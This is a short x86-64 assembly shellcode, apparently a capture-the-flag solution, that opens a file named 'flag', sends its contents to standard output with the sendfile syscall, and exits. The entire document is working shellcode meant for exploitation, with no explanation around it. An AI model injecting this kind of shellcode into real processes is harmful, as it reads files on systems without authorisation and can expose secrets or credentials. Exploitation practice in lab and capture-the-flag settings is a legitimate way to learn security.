.globl _start
_start:
.intel_syntax noprefix
    /* open("flag", O_RDONLY) */
    mov rsi, 0
    push 0x0067616c66
    mov rdi, rsp
    mov rax, 2
    syscall

    /* sendfile(stdout, fd_of_flag_file, 0, 1000) */
    mov r10, 1000
    mov rdx, 0
    mov rsi, rax
    mov rdi, 1
    mov rax, 40
    syscall

    /* exit() */
    mov rax, 60
    syscall
